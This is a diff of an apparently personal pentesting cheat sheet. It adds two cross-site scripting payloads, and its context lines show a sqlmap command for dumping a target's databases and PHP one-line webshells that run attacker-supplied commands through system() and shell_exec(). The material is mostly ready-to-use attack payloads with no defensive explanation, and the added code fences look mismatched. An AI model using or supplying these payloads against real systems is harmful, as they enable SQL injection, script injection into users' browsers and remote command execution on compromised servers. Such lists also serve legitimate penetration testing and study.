@@ -10,10 +10,12 @@ sqlmap -u "target-url" -p your-parament --random-agent --batch --dbs
 
 
 # XSS
-
+```
+<script>alert('XSS')</script> 
+"><img src=x onerror=alert(1)>
 
 # php file upload webshell
-
+```
 ```
 <?php system($_REQUEST["cmd"]);?> 
 <?php echo shell_exec($_GET['cmd']);?> 
